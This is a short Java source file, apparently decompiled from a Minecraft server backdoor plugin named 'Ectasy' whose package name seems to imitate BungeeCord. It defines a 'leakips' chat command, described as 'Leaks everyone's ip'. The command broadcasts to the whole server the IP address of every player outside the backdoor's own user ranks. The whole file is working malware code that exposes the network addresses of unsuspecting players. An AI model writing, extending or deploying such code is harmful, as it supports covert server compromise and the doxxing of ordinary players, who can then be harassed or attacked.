package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.user.User;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "leakips",
   description = "Leaks everyone's ip",
   blatant = false,
   rank = Rank.FREE
)
public class LeakIPCommand extends AbstractCommand {
   public LeakIPCommand() {
   }

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      for(User var5 : Ectasy.users.values()) {
         if (var5.rank == Rank.UNAUTHORIZED) {
            Bukkit.broadcastMessage(
               ChatColor.translateAlternateColorCodes('&', var5.player.getName() + "'s IP is &c" + var5.player.getAddress().getHostString())
            );
         }
      }
   }
}
